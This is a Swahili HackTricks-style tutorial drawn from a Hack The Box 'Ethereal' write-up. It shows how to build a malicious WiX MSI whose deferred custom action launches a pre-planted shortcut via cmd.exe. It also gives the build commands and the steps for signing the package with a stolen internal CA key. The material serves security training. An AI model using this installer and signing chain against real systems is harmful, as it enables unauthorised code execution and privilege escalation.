# Kuunda MSI ya Custom-Action kwa WiX

{{#include ../../banners/hacktricks-training.md}}

Mlolongo huu wa kihistoria wa Hack The Box ulitumia WiX Toolset v3 kuunda MSI iliyozindua faili ya `.lnk` iliyokuwa imepandikizwa awali. **MSI haipewi privileges moja kwa moja**: utekelezaji hufanyika katika muktadha unaochaguliwa na sera ya Windows Installer, attributes za custom-action, na yeyote anayesakinisha. Katika scenario iliyotajwa, mshambulizi pia aliiba trusted signing CA na kuweka MSI iliyosainiwa kwenye folder iliyokuwa ikifuatiliwa na mtumiaji mwingine.<sup>[[1]](#references)[[3]](#references)</sup>

Kwa uelewa wa kina wa mifano ya matumizi ya wix MSI, inapendekezwa kushauriwa [this page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Hapa, unaweza kupata mifano mbalimbali inayoonyesha matumizi ya wix MSI.<sup>[[2]](#references)</sup>

MSI inaendesha `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. XML ya awali ya WiX v3 imehifadhiwa hapa chini:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` hutangaza kiwango cha chini cha Windows Installer, na `Compressed="yes"` huashiria kwamba package imebanwa. `Stage1` ni deferred lakini ina `Impersonate="yes"`, hivyo huendeshwa kwa impersonated token ya mtumiaji anayesakinisha; mabadiliko ya privilege katika hali hii yalitokana na mtumiaji mwenye privilege aliyefungua MSI baadaye, si kutokana na attribute hiyo kuipa SYSTEM kwa uchawi.<sup>[[3]](#references)</sup>

Compile source kuwa WiX object kwa kutumia `candle.exe`:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Unganisha object hiyo kwenye MSI kwa kutumia `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Hatua ya signing iliyotumika katika chain ya awali

Workflow lengwa ilikubali packages zilizosainiwa na CA ya ndani iliyoathiriwa. Write-up ilitengeneza signing certificate kutoka kwa `MyCA.cer`/`MyCA.pvk` iliyopatikana, ikaunda PFX, na kusaini MSI:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
Mshambuliaji kisha aliweka kifurushi kilichotiwa sahihi katika `D:\DEV\MSIs` na kusubiri privileged workflow/user kukiendesha. Dumisha sharti hilo la awali unapobadilisha technique hii: bila elevated installation path, policy isiyo salama kama `AlwaysInstallElevated`, au privileged victim, kifurushi hiki hutekelezwa kwa rights za current user pekee.

## References

- [1] [Hack The Box - Ethereal: Kuunda msi hasidi na kupata root - Blogu ya 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Utangulizi mfupi: Kuunda MSI installer kwa kutumia WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Deferred execution custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
